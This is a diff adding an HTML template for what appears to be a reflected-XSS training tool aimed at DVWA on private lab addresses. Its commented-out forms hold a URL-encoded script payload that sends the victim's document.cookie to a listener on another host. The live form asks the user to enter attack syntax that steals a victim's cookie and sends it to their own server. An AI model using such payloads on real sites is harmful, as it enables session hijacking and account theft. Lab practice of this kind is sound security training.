@@ -1,0 +1,76 @@
+<!-- 宣告我們要套用模板 -->
+{% extends "base.html" %} {% block title %}XSS reflected project{% endblock %}
+{% block main %}
+<!-- <form action="http://192.168.242.129/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+i%3Dnew+Image%3Bi.src%3D%22http%3A%2F%2F192.168.242.131%3A8888%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E#">
+    <input type="submit" class="btn btn-danger" value="ATTACK!"/>
+</form> -->
+
+<!-- <form method="post" action="/">
+    <h3>Click this URL to get remote session</h3>
+    <input type="hidden" name="name" value="value" /> 
+    <a href="http://192.168.155.129/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+i%3Dnew+Image%3Bi.src%3D%22http%3A%2F%2F192.168.11.7%3A8888%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E#";>click here</a>
+    
+</form>     -->
+
+<form action="/getCookie" method="post">
+  <h3>Get victim's cookie and reverse to your server</h3>
+  <p>
+    請先架起一個監聽的 server，並在下方輸入攻擊語法，目的是取得被害者的 cookie
+    資訊並 reverse 至監聽的 server 上。<br />
+    <textarea type="text" name="nm" rows="3" cols="100"></textarea>
+  </p>
+  <p>
+    <input
+      type="submit"
+      value="ATTACK"
+      class="btn btn-danger"
+      style="margin-left: 5px"
+    />
+  </p>
+  <br />
+  <h4>Result: <br /></h4>
+  <p style="font-size: 20px; color: red"><u>{{result}}</u></p>
+</form>
+<body>
+  <p
+    style="width: fit-content; margin: 20px 20px 0px 20px; font-size: 20px"
+  ></p>
+
+  <!-- <script async>
+    const getIp = async () => {
+      const resp = await fetch("https://api.ipify.org/?format=json");
+      const data = await resp.json();
+      return data.ip;
+    };
+
+    const connectServer = async () => {
+      const ip = await getIp();
+      fetch(`http://localhost:5009/get_my_ip/${ip}`);
+    };
+    connectServer();
+  </script> -->
+  <!-- <script>alert('The flag is %s ');</script> % (flag) -->
+  <!-- <script type="text/JavaScript">
+        $(document).ready(function() {
+        $.ajax({
+            type: "GET",
+            url: "/get_my_ip"
+        });
+        });
+    </script> -->
+</body>
+
+{% endblock %}
+<!-- <form action = "/login" method = "post">
+        <h3>Pratice for POST</h3>
+        <p>Enter Name:</p>
+        <p><input type = "text" name = "nm" /></p>
+        <p><input type = "submit" value = "Add to URL" /></p>
+    </form>
+    <hr>
+    <form action = "/login" method = "get">
+        <h3>Pratice for GET</h3>
+        <p>Enter Name:</p>
+        <p><input type = "text" name = "nm" /></p>
+        <p><input type = "submit" value = "Add to URL" /></p>
+    </form> -->
